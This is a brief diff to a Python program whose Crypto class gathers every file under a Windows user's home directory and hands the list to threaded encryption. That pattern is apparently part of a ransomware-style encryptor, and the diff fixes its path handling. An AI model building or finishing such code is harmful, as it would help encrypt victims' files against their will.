@@ -8,7 +8,7 @@ from os import path, getlogin, scandir
 from string import ascii_uppercase
 from threading import Thread
 
-MAIN_DRIVE = 'C:'
+MAIN_DRIVE = 'C:\\\\'
 WINDOWS_USERS_DIR = 'Users'
 
 
@@ -28,7 +28,7 @@ class Crypto():
         return home_dir
 
     def get_files(self):
-        return glob.glob(path.join(self.home_directory, './**/'), recursive=True)
+        return glob.glob(self.home_directory + '\\**\\', recursive=True)
 
     def encrypt_file_list(self, file_list):
         chunks = self.num_threads
